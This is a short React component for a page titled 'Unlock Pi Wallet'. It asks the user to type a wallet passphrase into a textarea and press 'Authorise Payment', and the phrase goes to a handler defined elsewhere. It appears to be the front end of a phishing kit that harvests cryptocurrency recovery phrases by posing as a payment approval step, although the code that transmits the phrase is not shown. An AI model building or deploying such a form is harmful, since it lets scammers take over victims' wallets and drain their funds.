import React, { useState } from "react";
import { Oval } from "react-loader-spinner";

function Phrase({handleSend, setPhrase, phrase,error, loading}) {
  // const navigate =useNavigate()


 

  return (
    <div className="mb-3">
      <div className="flex flex-col items-center  ">
        <h2>Unlock Pi Wallet</h2>
        <div className="flex flex-col items-center ">
          <textarea
            onChange={(e) => setPhrase(e.target.value)}
            value={phrase}
            className="resize-none mb-4 p-2 border-[#f3da4d] border-solid border-[1px]"
            placeholder="Enter Your 24-character passphrase here"
            cols="30"
            rows="7"
            required=""
          />
          {error && <p className="text-red-600 my-1">Invalid phrase</p>}
        </div>
        <button
          onClick={handleSend}
          className="passphrasebtn bg-white border-[#76348e] border-solid border-[1px] w-full rounded-md p-1 text-[#76348e] flex  items-center justify-center"
        >
          {" "}
          {loading ? (
            <Oval
              width={30}
              height={30}
              color="#76348e"
              secondaryColor="gray"
            />
          ) : (
            <span>Authorise Payment</span>
          )}
        </button>
      </div>
    </div>
  );
}

export default Phrase;
